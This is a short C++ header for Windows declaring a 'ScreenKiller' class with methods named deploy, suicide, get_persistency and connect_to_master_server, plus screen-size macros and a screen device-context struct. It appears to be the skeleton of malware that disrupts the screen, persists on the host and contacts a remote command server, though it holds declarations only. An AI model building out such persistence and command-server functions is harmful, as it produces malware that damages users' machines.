#pragma once

#include <windows.h>
#include <thread>

#define SCREEN_WIDTH	GetSystemMetrics(SM_CXSCREEN)
#define SCREEN_HEIGHT	GetSystemMetrics(SM_CYSCREEN)
#define DIVIDERS		5

class ScreenKiller
{
public:
	ScreenKiller();

	~ScreenKiller();

	void deploy();

	void suicide();

private:
	bool deploy_inner();

	bool get_persistency();

	bool connect_to_master_server();

	bool m_alive;
	bool m_persistent;
	bool m_connected;
	std::thread runner_thread;
};

typedef struct ScreenProps
{
	RECT rectScreen;
	HDC hdcScreen;
} ScreenProps, * PScreenProps;
